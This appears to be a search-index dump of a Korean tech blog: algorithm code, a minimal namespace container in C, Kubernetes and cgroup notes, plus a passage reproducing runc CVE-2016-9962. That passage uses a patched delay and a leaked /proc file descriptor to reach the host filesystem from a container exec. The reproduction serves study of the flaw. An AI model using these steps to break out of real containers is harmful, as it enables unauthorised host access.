	"content": "// C++ program for implementation of Heap Sort #include \u0026lt;iostream\u0026gt; using namespace std; // To heapify a subtree rooted with node i which is // an index in arr[]. n is size of heap void heapify(int arr[], int n, int i) { int largest = i; // Initialize largest as root int l = 2*i + 1; // left = 2*i + 1 int r = 2*i + 2; // right = 2*i + 2 // If left child is larger than root if (l \u0026lt; n \u0026amp;\u0026amp; arr[l] \u0026gt; arr[largest]) largest = l; // If right child is larger than largest so far if (r \u0026lt; n \u0026amp;\u0026amp; arr[r] \u0026gt; arr[largest]) largest = r; // If largest is not root if (largest != i) { swap(arr[i], arr[largest]); // Recursively heapify the affected sub-tree heapify(arr, n, largest); } } // main function to do heap sort void heapSort(int arr[], int n) { // Build heap (rearrange array) for (int i = n / 2 - 1; i \u0026gt;= 0; i--) heapify(arr, n, i); // One by one extract an element from heap for (int i=n-1; i\u0026gt;=0; i--) { // Move current root to end swap(arr[0], arr[i]); // call max heapify on the reduced heap heapify(arr, i, 0); } } /* A utility function to print array of size n */ void printArray(int arr[], int n) { for (int i=0; i\u0026lt;n; ++i) cout \u0026lt;\u0026lt; arr[i] \u0026lt;\u0026lt; \u0026quot; \u0026quot;; cout \u0026lt;\u0026lt; \u0026quot;\\n\u0026quot;; } // Driver program int main() { int arr[] = {12, 11, 13, 5, 6, 7}; int n = sizeof(arr)/sizeof(arr[0]); heapSort(arr, n); cout \u0026lt;\u0026lt; \u0026quot;Sorted array is \\n\u0026quot;; printArray(arr, n); }  "
},
{
	"uri": "https://keyolk.github.io/system/container/inside/",
	"title": "inside",
	"tags": [],
	"description": "",
	"content": " Linux Features  namespace cgroups chroot pivot_root union mount bind mount iptables veth capabilities seccomp LSM  SELinux AppArmor   Linux에서 Container를 구성하는 주요 Kerenl Feature는 위와 같다.\nSimple Container 아래와 같이 간단한 container를 만들어 볼 수 있다. 유사한 project로 bocker가 있다.\n#define _GNU_SOURCE #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; #include \u0026lt;sys/mount.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sched.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define ChkErr(expr) if(expr!=0) { line=__LINE__; ret=expr; goto ErrorExit; } #define STACK_SIZE (1024 * 1024) static char child_stack[STACK_SIZE]; char* const child_args[] = { \u0026quot;/bin/sh\u0026quot;, NULL }; int checkpoint[2]; int ret; int line; void set_map(char* file, int inside_id, int outside_id, int len) { FILE* mapfd = fopen(file, \u0026quot;w\u0026quot;); if(NULL==mapfd) { perror(\u0026quot;open file error\u0026quot;); return; } fprintf(mapfd, \u0026quot;%d %d %d\u0026quot;, inside_id, outside_id, len); fclose(mapfd); } void set_uid_map(pid_t pid, int inside_id, int outside_id, int len) { char file[256]; sprintf(file, \u0026quot;/proc/%d/uid_map\u0026quot;, pid); set_map(file, inside_id, outside_id, len); } void set_gid_map(pid_t pid, int inside_id, int outside_id, int len) { char file[256]; sprintf(file, \u0026quot;/proc/%d/gid_map\u0026quot;, pid); set_map(file, inside_id, outside_id, len); } int child_main(void* arg) { char c; close(checkpoint[1]); printf(\u0026quot; - World !\\n\u0026quot;); sethostname(\u0026quot;In Namespace\u0026quot;, 12); read(checkpoint[0], \u0026amp;c, 1); chroot(\u0026quot;/home/keyolk/study/container/root\u0026quot;); chdir(\u0026quot;/\u0026quot;); setenv(\u0026quot;PATH\u0026quot;, \u0026quot;/bin\u0026quot;, 1); mount(\u0026quot;proc\u0026quot;, \u0026quot;/proc\u0026quot;, \u0026quot;proc\u0026quot;, 0, NULL); system(\u0026quot;ip link set veth1 up\u0026quot;); system(\u0026quot;ip addr add 169.254.1.2/30 dev veth1\u0026quot;); execv(child_args[0], child_args); printf(\u0026quot;Ooops!\\n\u0026quot;); return 1; } int main() { char* cmd; const int gid=getgid(), uid=getuid(); pipe(checkpoint); printf(\u0026quot;Parent: eUID = %ld; eGID = %ld, UID=%ld, GID=%ld\\n\u0026quot;, (long) geteuid(), (long) getegid(), (long) getuid(), (long) getgid()); printf(\u0026quot; - [%d] Hello ?\\n\u0026quot;, getpid()); int child_pid = clone(child_main, child_stack+STACK_SIZE, CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWNET | SIGCHLD, NULL); if (child_pid == -1) { printf(\u0026quot;Failed to clone process\\n\u0026quot;); return 1; } printf(\u0026quot;Parent %d, Container %d\\n\u0026quot;, getpid(), child_pid); set_uid_map(child_pid, 0, 1000, 1); set_gid_map(child_pid, 0, 1000, 1); system(\u0026quot;ip link add veth0 type veth peer name veth1\u0026quot;); asprintf(\u0026amp;cmd, \u0026quot;ip link set veth1 netns %d\u0026quot;, child_pid); system(cmd); system(\u0026quot;ip link set veth0 up\u0026quot;); system(\u0026quot;ip addr add 169.254.1.1/30 dev veth0\u0026quot;); free(cmd); close(checkpoint[1]); waitpid(child_pid, NULL, 0); system(\u0026quot;ip link delete veth0\u0026quot;); printf(\u0026quot;Parent: Container stopped!\\n\u0026quot;); return 0; }  "
},
{
	"uri": "https://keyolk.github.io/algorithm/datastructure/priority_queue/",
	"title": "priority queue",
	"tags": [],
	"description": "",
	"content": " Intro "
},
{
	"uri": "https://keyolk.github.io/algorithm/datastructure/queue/",
	"title": "queue",
	"tags": [],
	"description": "",
	"content": " Intro Implementation /*static circular queue*/ #include \u0026lt;stdio.h\u0026gt; #define size 5 void insertq(int[], int); void deleteq(int[]); void display(int[]); int front = - 1; int rear = - 1; int main() { int n, ch; int queue[size]; do { printf(\u0026quot;\\n\\n Circular Queue:\\n1. Insert \\n2. Delete\\n3. Display\\n0. Exit\u0026quot;); printf(\u0026quot;\\nEnter Choice 0-3? : \u0026quot;); scanf(\u0026quot;%d\u0026quot;, \u0026amp;ch); switch (ch) { case 1: printf(\u0026quot;\\nEnter number: \u0026quot;); scanf(\u0026quot;%d\u0026quot;, \u0026amp;n); insertq(queue, n); break; case 2: deleteq(queue); break; case 3: display(queue); break; } }while (ch != 0); } void insertq(int queue[], int item) { if ((front == 0 \u0026amp;\u0026amp; rear == size - 1) || (front == rear + 1)) { printf(\u0026quot;queue is full\u0026quot;); return; } else if (rear == - 1) { rear++; front++; } else if (rear == size - 1 \u0026amp;\u0026amp; front \u0026gt; 0) { rear = 0; } else { rear++; } queue[rear] = item; } void display(int queue[]) { int i; printf(\u0026quot;\\n\u0026quot;); if (front \u0026gt; rear) { for (i = front; i \u0026lt; size; i++) { printf(\u0026quot;%d \u0026quot;, queue[i]); } for (i = 0; i \u0026lt;= rear; i++) printf(\u0026quot;%d \u0026quot;, queue[i]); } else { for (i = front; i \u0026lt;= rear; i++) printf(\u0026quot;%d \u0026quot;, queue[i]); } } void deleteq(int queue[]) { if (front == - 1) { printf(\u0026quot;Queue is empty \u0026quot;); } else if (front == rear) { printf(\u0026quot;\\n %d deleted\u0026quot;, queue[front]); front = - 1; rear = - 1; } else { printf(\u0026quot;\\n %d deleted\u0026quot;, queue[front]); front++; } }  "
},
{
	"uri": "https://keyolk.github.io/algorithm/datastructure/stack/",
	"title": "stack",
	"tags": [],
	"description": "",
	"content": " Intro Implementation /* initialize stack pointer */ void init(int *top) { *top = 0; } /* push an element into stack precondition: the stack is not full */ void push(int *s,int* top, int element) { s[(*top)++] = element; } /* remove an element from stack precondition: stack is not empty */ int pop(int *s,int *top) { return s[--(*top)]; } /* return 1 if stack is full, otherwise return 0 */ int full(int *top,const int size) { return *top == size ? 1 : 0; } /* return 1 if the stack is empty, otherwise return 0 */ int empty(int *top) { return *top == 0 ? 1 : 0; } /* display stack content */ void display(int *s,int *top) { printf(\u0026quot;Stack: \u0026quot;); int i; for(i = 0; i \u0026lt; *top; i++) { printf(\u0026quot;%d \u0026quot;,s[i]); } printf(\u0026quot;\\n\u0026quot;); }  "
},
{
	"uri": "https://keyolk.github.io/algorithm/datastructure/tree/",
	"title": "tree",
	"tags": [],
	"description": "",
	"content": " Intro Tree Traversal  Exhaustive Branch and Bound  Tree Search  In/Pre/Post Order Binary/Ternary  Least Common Ancestor  Range Minimum Query  Binary Tree N Tree "
},
{
	"uri": "https://keyolk.github.io/network/",
	"title": "Network",
	"tags": [],
	"description": "",
	"content": "Network 관련 정리.\n"
},
{
	"uri": "https://keyolk.github.io/algorithm/datastructure/graph/",
	"title": "graph",
	"tags": [],
	"description": "",
	"content": " Intro  Topological Sort  Minmum Spanning Tree  Prim Kruskal  Graph Traversal  Depth First Search Breadth First Search Best Firset Search Hamiltionian Path Eulerian Path  Shortest Path  Floyd-Warshal Dijkstra Bellman-Ford  Implementation Adjust Matrix Adjust List // A simple representation of graph using STL #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; // A utility function to add an edge in an // undirected graph. void addEdge(vector\u0026lt;int\u0026gt; adj[], int u, int v) { adj[u].push_back(v); adj[v].push_back(u); } // A utility function to print the adjacency list // representation of graph void printGraph(vector\u0026lt;int\u0026gt; adj[], int V) { for (int v = 0; v \u0026lt; V; ++v) { cout \u0026lt;\u0026lt; \u0026quot;\\n Adjacency list of vertex \u0026quot; \u0026lt;\u0026lt; v \u0026lt;\u0026lt; \u0026quot;\\n head \u0026quot;; for (auto x : adj[v]) cout \u0026lt;\u0026lt; \u0026quot;-\u0026gt; \u0026quot; \u0026lt;\u0026lt; x; printf(\u0026quot;\\n\u0026quot;); } } // Driver code int main() { int V = 5; vector\u0026lt;int\u0026gt; adj[V]; addEdge(adj, 0, 1); addEdge(adj, 0, 4); addEdge(adj, 1, 2); addEdge(adj, 1, 3); addEdge(adj, 1, 4); addEdge(adj, 2, 3); addEdge(adj, 3, 4); printGraph(adj, V); return 0; }  #include \u0026lt;cstdio\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;list\u0026gt; #include \u0026lt;utility\u0026gt; using namespace std; int main() { int vertices, edges, v1, v2, weight; printf(\u0026quot;Enter the Number of Vertices -\\n\u0026quot;); scanf(\u0026quot;%d\u0026quot;, \u0026amp;vertices); printf(\u0026quot;Enter the Number of Edges -\\n\u0026quot;); scanf(\u0026quot;%d\u0026quot;, \u0026amp;edges); // Adjacency List is a vector of list. // Where each element is a pair\u0026lt;int, int\u0026gt; // pair.first -\u0026gt; the edge's destination // pair.second -\u0026gt; edge's weight vector\u0026lt; list\u0026lt; pair\u0026lt;int, int\u0026gt; \u0026gt; \u0026gt; adjacencyList(vertices + 1); printf(\u0026quot;Enter the Edges V1 -\u0026gt; V2, of weight W\\n\u0026quot;); for (int i = 1; i \u0026lt;= edges; ++i) { scanf(\u0026quot;%d%d%d\u0026quot;, \u0026amp;v1, \u0026amp;v2, \u0026amp;weight); // Adding Edge to the Directed Graph adjacencyList[v1].push_back(make_pair(v2, weight)); } printf(\u0026quot;\\nThe Adjacency List-\\n\u0026quot;); // Printing Adjacency List for (int i = 1; i \u0026lt; adjacencyList.size(); ++i) { printf(\u0026quot;adjacencyList[%d] \u0026quot;, i); list\u0026lt; pair\u0026lt;int, int\u0026gt; \u0026gt;::iterator itr = adjacencyList[i].begin(); while (itr != adjacencyList[i].end()) { printf(\u0026quot; -\u0026gt; %d(%d)\u0026quot;, (*itr).first, (*itr).second); ++itr; } printf(\u0026quot;\\n\u0026quot;); } return 0; }  "
},
{
	"uri": "https://keyolk.github.io/security/",
	"title": "Security",
	"tags": [],
	"description": "",
	"content": " Security Rootkit 등 Malware 동작; Vulnerability와 그에 따른 Exploit; Certificates/Key 등 Secret Management 관련 내용 정리.\nContents  vulnerability   openscap   rootkit   "
},
{
	"uri": "https://keyolk.github.io/algorithm/network/",
	"title": "network",
	"tags": [],
	"description": "",
	"content": " Intro  Ford Fulkerson Bipartite Matching MCMF Hungarian Method  "
},
{
	"uri": "https://keyolk.github.io/algorithm/computational_geometry/",
	"title": "computational geometry",
	"tags": [],
	"description": "",
	"content": " Intro  Closest Pair  Line Sweeping  Farthest Pair  CCW Graham Scan Method Rotatin Calipers   "
},
{
	"uri": "https://keyolk.github.io/algorithm/string_matching/",
	"title": "string matching",
	"tags": [],
	"description": "",
	"content": " Intro  Knuth-Moriss-Pratt Aho-Corasick  "
},
{
	"uri": "https://keyolk.github.io/algorithm/mathematics/",
	"title": "mathematics",
	"tags": [],
	"description": "",
	"content": " Intro  Modulor Prime Number  Sieve of Eratosthenes  Prime Factorization Greatest Common Divisor  Euclid\u0026rsquo;s Algorithm  Least Common Multiplier Base Conversion Factorial Combination Permutation  "
},
{
	"uri": "https://keyolk.github.io/algorithm/etc/",
	"title": "etc",
	"tags": [],
	"description": "",
	"content": " Intro Maximum Sum Sub Array  Kadane\u0026rsquo;s Algorithm  "
},
{
	"uri": "https://keyolk.github.io/system/container/kubernetes/",
	"title": "kubernetes",
	"tags": [],
	"description": "",
	"content": " Intro Production 환경에서, Kubernetes를 어떻게 배포/구성할지에 대해 정리.\n아래 사항에 대해서 Best Practice 찾아 기술.\n deploy availability security performance  Deployment Multi Cloud 환경과 같이 infra 제공자가 다양한 경우 반복적으로 Cluster를 배포하게된다.\nProcess에 따라 Kubernetes의 Cluster Federation도 활용될 수 있으며 이를 고려한 배포가 이뤄져야 한다.\n전반적인 배포 제어는 Ansible과 같은 도구를 활용하여 자동화한다.\nMulti Cloud Cluster를 배포할때, Multi Cloud를 통한 Affinity를 고려하자면 Hashicorp의 Terraform과 같은 추상화된 Cloud Management Tool을 사용하는게 좋다.\ninstance가 확보되고 나면 cloud-config를 같은 도구를 활용하여 일관성 있게 각 instance를 초기화하도록 한다.\nSelf Hosting Self Hosted Cluster를 구성하면 배포 이후 Cluster의 변경사항을 관리하는데 용이하다. kubelet은 독립적으로 Pod을 hosting 할 수 있으므로 이를 이용해 apiserver, control manager, proxy를 구동하도록 한다.\nbinary는 hyperkube 같은 묶음을 활용하면 일관성있게 binary를 관리할 수 있다. hyperkube image에 대한 배포도 container image를 활용하되 kubelet을 실행하는 container engine이 Resilency한지 따져봐야한다. Docker 경우 최근 version에서 이를 지원하며 그외 CoreOS의 RKT나 LXC 등을 활용할 수 있다.\nNetwork Self Hosted Cluster를 구성할땐 CNI network을 사용해야한다. CNI를 활용할 경우 kubelet은 cluster의 KV storage에 직접 접근하여 network fabric을 구성한다.\nCNI option으론 Calico + Flannel 조합으로 VxLan을 많이 사용한다. 아래의 Canal을 통해 쉽게 배포 할 수 있다.\nhttps://github.com/projectcalico/canal\nCanal은 새로운 Kubelet이 등록되면 DaemonSet으로 필요한 Network Fabric Asset을 전달하도록 되어있다.\nNetwork에 대한 변경이 이뤄지면 일관적으로 전체 cluster node에 이를 전파할 수 있다.\nEndpoints kubelet에서 kube apiserver 및 KV storage에 일관적으로 접속이 가능해야한다. 내부 load balancer를 구성하여 connection을 보장해 준다.\nMaster와 KV storage는 HA하게 구성한다.\nSecret Kuberntes에서 Secret 관리와 관련된 내용을 정리한다.\nhttp://kubernetes.io/docs/user-guide/secrets/\nKubernetes에선 자체적으로 Secret System을 가지고 있으나 data는 KV stroage 내에서 암호화 되지 않은채로 존재한다.\n즉, etcd에 대한 접근 권한이 있으면 모든 secret을 가져갈 수 있다.\netcd 자체적으로 제공하는 auth는 client certificates가 있고 이에 대해서 ACL도 제공하므로 이를 이용하면 보다 secure하게 이를 관리할 수 있으나, 근본적으로 data 유출에 대한 위험은 남아있게된다.\n앞서 보았듯 self hosting 하게 cluster를 구성하는경우 network를 CNI로 구성하게 되는데 kubelet이 직접 KV storage에 접근하게 된다.\nSecret Encryption 모든 kubelet node에서 etcd에 대해 접근 권한을 갖게되는것이므로 유의해야한다.\nsecret data를 암호화하기 위한 option으로 vault가 많이 고려된다. 아직 kubernetes에서 secret에 대해 plugin 형태의 interface를 제고하고 있지 않아 사용하기 용이한 implementation은 아직 없으나 kubernetes에 맞춘 vault controller를 제공하는 proeject가 몇가지 존재한다.\n아래는 vault와 관련된 link이다.\n Hashicorp Vault : https://github.com/hashicorp/vault  dicussions : https://github.com/kubernetes/kubernetes/issues/10439#issuecomment-263954184 generate PKI stufss for kubernetes components : https://www.digitalocean.com/company/blog/vault-and-kubernetes/ deploy vault in kubernetes : http://www.devoperandi.com/vault-in-kubernetes-take-2/ vault integration with kubernetes pod https://github.com/Boostport/kubernetes-vault https://github.com/kelseyhightower/vault-controller   TLS Assets 위의 Vault를 통해 Kubernetes Component 들이 사용하는 TLS Asset들을 관리할 수 있다. Consul + Vault + Consul Template 조합으로 pki backend를 사용한다.\n다만 이를 kubelet 하나로 Self Hosted 하게 구성하려고 할때, 당장 편리해보이는 방법을 모르겠다.\napiserver를 구성하는 kubelet에 vault와 consul template을 같이 올리는 방법도 있을것 같으나 좀더 고민이 필요하다.\nAuth Kubernetes Auth와 관련, 대략적인 내용과 link들을 정리한다.\n Authentication : http://kubernetes.io/docs/admin/authentication/  Basic Auth Client Certificates Static Token Webhook Token KeyStone Password Authenticating Proxy OIDC Token : Google OIDC Auth0 CoreOS Dex : https://github.com/coreos/dex  Google OIDC : https://github.com/coreos/dex/blob/master/Documentation/openid-connect.md Github OAuth : https://github.com/coreos/dex/blob/master/Documentation/github-connector.md LDAP : https://github.com/coreos/dex/blob/master/Documentation/ldap-connector.md  Redhat KeyCloak : http://www.devoperandi.com/kubernetes-authentication-openid-connect/ CloudFoundry UAA : https://apigee.com/about/tags/kubernetes  Authorization : http://kubernetes.io/docs/admin/authorization/  ABAC RBAC : https://github.com/uruddarraju/kubernetes-rbac-policies Webhook bitesize-authz-webhook : https://github.com/pearsontechnology/bitesize-authz-webhook   AuthN CoreOS Dex의 경우 JBoss의 Keyclak이나 CloudFoundry의 UAA에 비해서 전반적으로 구조가 단순하고 배포하기 용이하다. 다른 Solution에 비해 덜성숙된 느낌을 같지만 사용함에 문제가 없었다. 별도 Client를 구성 해야하는 번잡함이 있긴하다.\nAuthZ RBAC이 현재로는 apiserver의 재기동 없이 dynamic하게 policy를 적용할 수 있는 거의 유일한 option 이다. Webhook을 통해 외부 instance에서 처리하는 방법도 있으나 별도로 자체 구축해야하며, 알려진 opensource 중에선 뚜렷이 눈에 띄는게 없었다.\nToDo Login : kubectl의 경우 아직 login관련된 feature가 없다 Token을 kubeConfig에 따로 전달해주어야한다. 별도 CLI wrapper를 사용할 수 있다.\nRBAC : User record가 생성될때 이에따라 필요한 RBAC policy를 생성할 controller가 필요하다. 없을 시 수동으로 처리해줘야한다.\n"
},
{
	"uri": "https://keyolk.github.io/security/vulnerability/cve-2016-9962/",
	"title": "CVE-2016-9962",
	"tags": [],
	"description": "",
	"content": " CVE-2016-9962 reproduction step described at here\n$ cd $GOPATH/src/github.com $ git clone https://github.com/opencontainers/runc opencontainers/runc $ git fetch origin 2cc5a91249ab3b362f1235da955d112017979d34 $ git checkout origin 2cc5a91249ab3b362f1235da955d112017979d34 $ vi $GOPATH/src/github.com/opencontainers/runc/libcontainer/setns_init_linux.go  아래 2개 line을 수정한다.\npackage libcontainer import ( \u0026quot;fmt\u0026quot; \u0026quot;os\u0026quot; \u0026quot;github.com/opencontainers/runc/libcontainer/apparmor\u0026quot; \u0026quot;github.com/opencontainers/runc/libcontainer/keys\u0026quot; \u0026quot;github.com/opencontainers/runc/libcontainer/label\u0026quot; \u0026quot;github.com/opencontainers/runc/libcontainer/seccomp\u0026quot; \u0026quot;github.com/opencontainers/runc/libcontainer/system\u0026quot; + \u0026quot;time\u0026quot; )  if err := label.SetProcessLabel(l.config.ProcessLabel); err != nil { return err } + time.Sleep(500 * time.Second) return system.Execv(l.config.Args[0], l.config.Args[0:], os.Environ()) }  container를 생성한다.\nsh1$ docker pull alpine sh1$ docker create --name alpine alpine sh1$ mkdir rootfs sh1$ docker export alpine | tar xvfC - rootfs/ sh1$ runc spec sh1$ runc run ctr  terminal을 새로 열고 container 내부에 process를 생성한다.\nsh2$ runc exec ctr sh  여기서 500 초가량 block된다. 다시 첫번째 terimnal로 돌아간다.\nsh1$ ps aux sh1$ ls /proc/18/fd -la sh1$ ls -la /proc/18/fd/4/../../..  위와 같은 방식으로 Host의 rootfs에 접근이 가능하다.\n"
},
{
	"uri": "https://keyolk.github.io/system/container/",
	"title": "Container",
	"tags": [],
	"description": "",
	"content": " Container Container 관련 표준; Orechstration 도구 운용; 자동화 관련 내용 정리.\n Container Engine : docker, rkt 등 Orchestration Tool : kuberentes, swarm 등 ETC : Ansible, Consul, Terraform, Vault, Dex 등 container managing에 활용되는 기술  Performance Analysis  https://www.slideshare.net/brendangregg/container-performance-analysis  Contents  network   security   inside   kubernetes   standard   "
},
{
	"uri": "https://keyolk.github.io/tags/gnome/",
	"title": "Gnome",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://keyolk.github.io/language/",
	"title": "Language",
	"tags": [],
	"description": "",
	"content": " Language 언어 별 feature; 내부 동작; Design Pattern; Library 관련 내용 정리.\nContents  functional programming   lambda   regular expression   shellscript   "
},
{
	"uri": "https://keyolk.github.io/system/storage/",
	"title": "Storage",
	"tags": [],
	"description": "",
	"content": " Storage 관련 정리 "
},
{
	"uri": "https://keyolk.github.io/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://keyolk.github.io/tags/terminal/",
	"title": "Terminal",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://keyolk.github.io/system/virtual_machine/",
	"title": "Virtual Miachine",
	"tags": [],
	"description": "",
	"content": " Virtual Machine 관련 정리 HVM \u0026amp; PV  Hardware Virtual Machine(Full Virtualization) Para Virtualization  PV는 guest os 에서 hypervisor를 통해 hardware를 제어해야 하므로 guest os의 kernel에 변경이 들어감.\nHVM은 CPU의 VT기능을 활용.\n일반적으로 PV가 HVM 보다 성능이 좋으나 큰차이는 없음.\n"
},
{
	"uri": "https://keyolk.github.io/network/arp/",
	"title": "arp",
	"tags": [],
	"description": "",
	"content": "Address Resolution Protocol\n"
},
{
	"uri": "https://keyolk.github.io/system/linux/cgroup/",
	"title": "cgroup",
	"tags": [],
	"description": "",
	"content": " Process group별 Management를 제공하는 I/F이다.\nCgroup자체는 Process Grouping만을 수행하며, Resource에 대한 관리는 Subsystem을 통해 이뤄진다. Cgroup으로 만들어진 Process Group은 hierachy하게 만들어질 수 있다.\n결과적으로 Cgroup을 통해 다음과 같은 기능을 제공한다.\n limiting : Group에 대한 resoure 사용 제한.  prioritization : CPU 및 disk I/O 자원에 대한 우선순위 부여.  accounting : System에서 사용하는 resource 측정.  control : Group별 contol 제공.  sysfs나 procfs와 같이 low-level filesystem interface로 구현되며, 모든 cgroups 관련 action은 filesystem을 통해서 이뤄진다.\ncreate/remove directory, read/write file, mount/umount\n cgroup inode_operation : cgroup mkidr/rmdir cgroup file_system_type : cgroup mount/umount cgroup file_operation : read/write to control file     subsystem version     cgroups 2.6.24   net_prio 3.3   net_cls 3.3   blkio async I/O 3.10    User View 일반적으로 /sys/fs/cgroups에 cgroupfs가 mount된다. 여기서 생성되는 모든 entry는 reboot될때 지워진다. → persistent 하지 않다.\n$ ls -l /sys/fs/cgroups total 0 dr-xr-xr-x 2 root root 0 Jan 1 1970 bfqio dr-xr-xr-x 4 root root 0 Jan 1 1970 blkio lrwxrwxrwx 1 root root 11 Jan 1 1970 cpu -\u0026gt; cpu,cpuacct dr-xr-xr-x 4 root root 0 Jan 1 1970 cpu,cpuacct lrwxrwxrwx 1 root root 11 Jan 1 1970 cpuacct -\u0026gt; cpu,cpuacct dr-xr-xr-x 3 root root 0 Jan 1 1970 cpuset dr-xr-xr-x 4 root root 0 Jan 1 1970 devices dr-xr-xr-x 3 root root 0 Jan 1 1970 freezer lrwxrwxrwx 1 root root 16 Jan 1 1970 net_cls -\u0026gt; net_cls,net_prio dr-xr-xr-x 2 root root 0 Jan 1 1970 net_cls,net_prio lrwxrwxrwx 1 root root 16 Jan 1 1970 net_prio -\u0026gt; net_cls,net_prio dr-xr-xr-x 2 root root 0 Jan 1 1970 perf_event dr-xr-xr-x 4 root root 0 Jan 1 1970 systemd`  전체 cgroup에 대한 요약정보를 /proc에서 얻을 수 있다.\n$ cat /proc/cgruops #subsys_name hierarchy num_cgroups enabled cpuset 7 3 1 cpu 4 41 1 cpuacct 4 41 1 blkio 5 41 1 memory 0 1 0 devices 3 41 1 freezer 9 3 1 net_cls 2 1 1 bfqio 8 1 1 perf_event 6 1 1 net_prio 2 1 1  현재 process와 관련, mount된 cgroup을 다음과 같이 알 수 있다.\n$ cat /proc/self/cgroup 9:devices:/user.slice/user-0.slice/session-c3.scope 8:net_cls,net_prio:/ 7:perf_event:/ 6:cpuset:/ 5:freezer:/ 4:bfqio:/ 3:blkio:/user.slice/user-0.slice/session-c3.scope 2:cpu,cpuacct:/user.slice/user-0.slice/session-c3.scope 1:name=systemd:/user.slice/user-0.slice/session-c3.scope [root@pi boot]# cat /proc/$$/cgroup 9:devices:/user.slice/user-0.slice/session-c3.scope 8:net_cls,net_prio:/ 7:perf_event:/ 6:cpuset:/ 5:freezer:/ 4:bfqio:/ 3:blkio:/user.slice/user-0.slice/session-c3.scope 2:cpu,cpuacct:/user.slice/user-0.slice/session-c3.scope 1:name=systemd:/user.slice/user-0.slice/session-c3.scope  cgroup tree에 관해선 아래와 같은 rule이 적용된다.\nKernel View kernel 내 아래 path에 cgroup 관련 hook이 들어가 있다.\n in boot phase  start_kernel() : http://lxr.free-electrons.com/source/init/main.c?v=4.0#L489 cgroup_init_early() : http://lxr.free-electrons.com/source/init/main.c?v=4.0#L508 cgroup_init_early() : http://lxr.free-electrons.com/source/include/linux/cgroup.h#L32 cgroup_init_early() : http://lxr.free-electrons.com/source/kernel/cgroup.c?v=4.0#L4953 cgroup_init() : http://lxr.free-electrons.com/source/init/main.c?v=4.0#L657 cgroup_init() : http://lxr.free-electrons.com/source/include/linux/cgroup.h#L33 cgroup_init() : http://lxr.free-electrons.com/source/kernel/cgroup.c?v=4.0#L4987  in process creation/destory method, fork() \u0026amp; exit()  copy_procyss() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1190 cgroup_fork() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1324 cgroup_fork() : http://lxr.free-electrons.com/source/include/linux/cgroup.h?v=4.0#L34 cgroup_fork() : http://lxr.free-electrons.com/source/kernel/cgroup.c?v=4.0#L5182 cgroup_post_fork() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1549 cgroup_post_fork() : http://lxr.free-electrons.com/source/include/linux/cgroup.h?v=4.0#L35 cgroup_post_fork() : http://lxr.free-electrons.com/source/kernel/cgroup.c?v=4.0#L5198  new file system type “cgroup” (VFS)  /sys/fs/cgroup : system에서 사용하는 cgroup mount point  process descriptor additions (struct task_struct) procfs entries :  /proc/pid/cgroup /proc/cgroups   task_struct내에서 관련 filed를 찾을 수 있다. struct task_struct : http://lxr.free-electrons.com/source/include/linux/sched.h?v=4.0#L1278 struct css_set __rcu *cgroups : http://lxr.free-electrons.com/source/include/linux/sched.h?v=4.0#L1570 struct css_set : http://lxr.free-electrons.com/source/include/linux/cgroup.h?v=4.0#L325 아래에서 list가 link된다. struct list_head task : http://lxr.free-electrons.com/source/include/linux/cgroup.h?v=4.0#L343 지원하는 subsystem에 대해 기술되어 있다. cgroup_subsys.h : http://lxr.free-electrons.com/source/include/linux/cgroup_subsys.h?v=4.0 Subsystem Group별로 Subsystem을 통해 Group을 제어 할 수 있다. 상위 Group의 Subsystem 정책은 하위로 상속된다. 4.1 기준으로 현재 11개의 subsystem을 지원해주고 있다.  cpuset_subsys  개별 cpu와 memory node를 task에 할당한다. struct cgroup_subsys cpuset_cgrp_subsys : http://lxr.free-electrons.com/source/kernel/cpuset.c?v=4.0#L2036  freezer_subsys  task를 suspend하거나 resume 한다. struct cgroup_subsys freezer_cgrp_subsys : http://lxr.free-electrons.com/source/kernel/cgroup_freezer.c?v=4.0#L476  mem_cgroup_subsys  task의 memory 사용을 제한하고 task의 memory 사용량을 report 한다. struct cgroup_subsys : http://lxr.free-electrons.com/source/mm/memcontrol.c?v=4.0#L5381  blkio_subsys  block device의 input/output을 제한한다. struct cgroup_subsys blkio_cgrp_subsys : http://lxr.free-electrons.com/source/block/blk-cgroup.c?v=4.0#L924  net_prio_subsys  network interface 별로 priority를 동적으로 설정해준다. struct cgroup_subsys net_prio_cgrp_subsys : http://lxr.free-electrons.com/source/net/core/netprio_cgroup.c?v=4.0#L247 module로 사용 가능.  devices_subsys  task의 device access를 제한한다. struct cgroup_subsys devices_cgrp_subsys : http://lxr.free-electrons.com/source/security/device_cgroup.c?v=4.0#L794  perf_subsys  struct cgroup_subsys perf_event_cgrp_subsys : http://lxr.free-electrons.com/source/kernel/events/core.c?v=4.0#L8629  hugetlb_subsys  struct cgroup_subsys hugetlb_cgrp_subsys : http://lxr.free-electrons.com/source/mm/hugetlb_cgroup.c?v=4.0#L418  cpu_cgrp_subsys  struct cgroup_subsys cpu_cgrp_subsys : http://lxr.free-electrons.com/source/kernel/sched/core.c?v=4.0#L8363  cpuacct_subsys  struct cgroup_subsys cpuacct_cgrp_subsys : http://lxr.free-electrons.com/source/kernel/sched/cpuacct.c?v=4.0#L278  net_cls_subsys  module로 사용 가능.   위는 다시 아래와 같이 구분해볼 수 있다.\n Isolation and Sepcial Controller  cpuset, namespace, freezer, device, checkpoint/restart  Resource Controller  cpu(scheduler), memory, disk I/O, network   subsystem은 각기 따로 사용할수도 있고 한번에 사용할 수도 있다.\n$ mount -t cgroup -o cpu none /cpu $ mount -t cgroup -o cpuset none /cpuset $ mount -t cgroup none /cgroups  Cgroup Control Systemd systemd를 사용하는 system에선 systemd 도구로 cgroup을 제어할 수 있다. 다음 명령은 system 상에 존재하는 cgroup과 subsystem 구조를 보여준다.\n$ systemd-cgls  cgroup별 resource 사용 현황도 